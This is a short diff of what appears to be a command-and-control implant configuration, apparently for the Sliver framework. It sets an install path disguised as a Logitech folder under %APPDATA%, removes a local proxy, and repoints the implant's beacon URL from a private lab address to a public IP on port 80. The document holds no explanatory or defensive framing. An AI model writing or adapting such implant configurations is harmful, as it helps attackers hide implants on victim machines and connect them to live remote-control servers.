@@ -10,7 +10,7 @@
     "MaxConnectionErrors": 5,
     "ReconnectInterval": 600,
     "SliverPath": "%APPDATA%\\Logitech",
-    "Proxy": "socks5//:127.0.0.1:1080",
+    "Proxy": "",
     "Protocol": 0,
     "Type": 0,
     "Loot": false,
@@ -42,7 +42,7 @@
             "MinNumberOfSegments": 2,
             "MaxNumberOfSegments": 4,
             "PollInterval": 3,
-            "URL": "http://192.168.192.129"
+            "URL": "http://34.56.17.244:80"
         }
     ],
     "PivotConfigs": []
